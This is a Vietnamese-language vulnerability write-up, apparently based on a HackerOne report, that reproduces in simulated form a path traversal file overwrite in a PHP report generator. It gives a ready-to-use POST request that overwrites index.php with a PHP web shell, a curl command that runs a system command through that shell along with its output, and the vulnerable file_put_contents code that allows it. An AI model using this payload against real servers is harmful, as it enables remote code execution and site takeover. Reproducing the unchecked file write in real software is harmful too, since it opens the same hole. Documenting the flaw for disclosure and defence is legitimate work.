# https://hackerone.com/reports/2733190
---

## 🎯 **Tên lỗ hổng:**

**Ghi đè tùy ý tệp trên máy chủ thông qua chức năng upload hoặc module tạo file**

---


## 📜 **Tái hiện mô phỏng kỹ thuật chi tiết:**

### 🧩 **Bối cảnh hệ thống (giả lập)**

* Trang web: `https://example.com/`
* Có chức năng tạo file từ đầu vào người dùng (có thể là tạo báo cáo, template, backup, etc.)
* Module `/report_generator.php` cho phép ghi tệp vào thư mục `/generated_reports/`

---

### 🧪 **Bước 1: Gửi request tạo file**

```http
POST /report_generator.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

filename=../index.php&content=<?php system($_GET['cmd']); ?>
```

> 💥 Kết quả: File `/var/www/html/index.php` bị **ghi đè bằng shell**
> Tức là lần sau user truy cập `https://example.com/` → **shell PHP được thực thi**

---

### 🧪 **Bước 2: Truy cập shell**

```bash
curl 'https://example.com/?cmd=id'
```

> ✅ Server trả về:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 📌 **Lưu ý từ báo cáo gốc:**

* Mặc định ghi vào `/generated_reports/goedix.php`
* Nhưng **có thể ghi ra bất kỳ path nào** như `/index.php`
* Nếu có URL rewrite, cần sửa thủ công đường dẫn trong Burp:

  * Từ `/generated_reports/index.php`
  * Thành `/index.php` (ghi đè gốc root)

---

## 🔍 **Phân tích nguyên nhân gốc rễ (Root Cause)**

* **Thiếu kiểm tra đường dẫn đầu vào** → Path Traversal
* **Không lọc ký tự nguy hiểm như `../`**
* Module xử lý ghi file kiểu:

```php
$file = $_POST['filename'];
$data = $_POST['content'];
file_put_contents("/var/www/html/generated_reports/" . $file, $data);
```

> 🛑 Dễ dàng **escape khỏi thư mục mặc định** bằng `../`, ghi đè file quan trọng.

---
